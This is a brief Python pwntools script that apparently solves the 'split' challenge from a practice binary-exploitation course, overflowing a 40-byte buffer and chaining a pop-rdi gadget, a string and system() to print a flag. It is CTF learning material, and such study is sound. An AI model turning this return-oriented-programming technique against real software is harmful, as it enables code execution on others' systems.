#!/usr/bin/env python3

from pwn import *

# Preparation Binary and process
elf = context.binary = ELF('split')
p = process(elf.path)

# ROP Chain
rop = ROP(elf)
rop.raw(0x00000000004007c3)
rop.raw(elf.symbols['usefulString'])
rop.raw(elf.symbols['system'])
print(rop.dump())

#Exploiting
payload = flat(
	b'A' * 40,
	rop.chain()
)

p.sendline(payload)
p.recvuntil('> ')
p.recvline()
print("[+] FLAG: {}".format(p.recvline()))
